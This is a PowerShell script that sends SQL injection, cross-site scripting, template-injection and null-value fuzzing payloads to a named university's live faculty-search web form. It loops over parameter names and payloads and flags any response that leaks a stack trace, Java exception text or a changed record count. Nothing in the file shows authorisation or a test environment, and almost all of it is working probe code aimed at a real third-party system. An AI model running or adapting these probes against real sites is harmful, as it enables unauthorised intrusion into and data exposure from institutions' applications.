
$form = @{
    'keyword[0]' = "' OR '1'='1"
    'college.desc' = 'Any'
    'world.desc' = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
}

<#
$form = @{
    'keyword' = 'valid'
    'keyword[0]' = "' OR '1'='1"
}

$form = @{
    'test' = 'John'
    'college.desc' = 'Any'
}
#>

$resp = Invoke-WebRequest -Uri https://grand.drexel.edu/ifac_du/searchFacultyByKeywords -Form $form -Method Post




                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         



# Define target URL
$targetUrl = "https://grand.drexel.edu/ifac_du/searchFacultyByKeywords"

# Common SQLi / input manipulation payloads
$payloads = @(
    "null",
    "",
    0,
    "[]",
    "{}",
    "test, test2"
)

# Other form parameters
$staticFormFields = @{
    'college.desc' = 'Any'
    'world.desc' = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
}

foreach ($payload in $payloads) {
    # Combine static and dynamic form data
    $form = $staticFormFields.Clone()
    $form['keyword'] = $payload

    try {
        $resp = Invoke-WebRequest -Uri $targetUrl -Method Post -Form $form -UseBasicParsing
        $html = $resp.Content

        # Check for interesting signs in the response
        if ($html -match "Exception|SQLException|stack trace|error|Unexpected application error") {
            Write-Host "`n[!] Interesting response with payload: $payload" -ForegroundColor Yellow
        } elseif ($html -match "Total <b>\d+</b> record\(s\) found") {
            $count = [regex]::Match($html, "Total <b>(\d+)</b> record\(s\) found").Groups[1].Value
            Write-Host "`n[+] Payload: $payload → Result count: $count" -ForegroundColor Green
        } else {
            Write-Host "[-] Payload: $payload → No notable response"
        }
    } catch {
        Write-Host "[X] Request failed with payload: $payload" -ForegroundColor Red
    }
}







# Target URL
$targetUrl = "https://grand.drexel.edu/ifac_du/searchFacultyByKeywords"

# Known form params that should be included
$baseForm = @{
    'college.desc' = 'Any'
    'world.desc' = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
}

# Random param names to fuzz with
$paramNames = @("test", "foo", "bar", "q", "nullParam", "input", "search", "inject", "x", "y", "keyword", "keyword[0]", "keyword[]")

# Fuzz payloads that might break internal logic
$payloads = @(
    "",
    $null,
    "null",
    "undefined",
    "123",
    "{}",
    "[]",
    "'",
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "${7*7}"
)

# Stack trace detection keywords
$errorKeywords = @("Exception", "java.lang", "edu.drexel", "StackTrace", "Servlet", "Handler", "invoke", "Caused by")

# Start fuzzing
foreach ($param in $paramNames) {
    foreach ($payload in $payloads) {
        $form = $baseForm.Clone()
        $form[$param] = $payload

        try {
            $resp = Invoke-WebRequest -Uri $targetUrl -Method Post -Form $form -UseBasicParsing
            $content = $resp.Content

            $stackHit = $false
            foreach ($keyword in $errorKeywords) {
                if ($content -like "*$keyword*") {
                    $stackHit = $true
                    break
                }
            }

            if ($stackHit) {
                Write-Host "`n[🔥] Stack trace or error detected!" -ForegroundColor Red
                Write-Host "[+] Param: $param" -ForegroundColor Cyan
                Write-Host "[+] Payload: $payload" -ForegroundColor Cyan
            } else {
                Write-Host "[-] $param = $payload → No error"
            }

        } catch {
            Write-Host "[X] Request failed for $param = $payload" -ForegroundColor DarkRed
        }
    }
}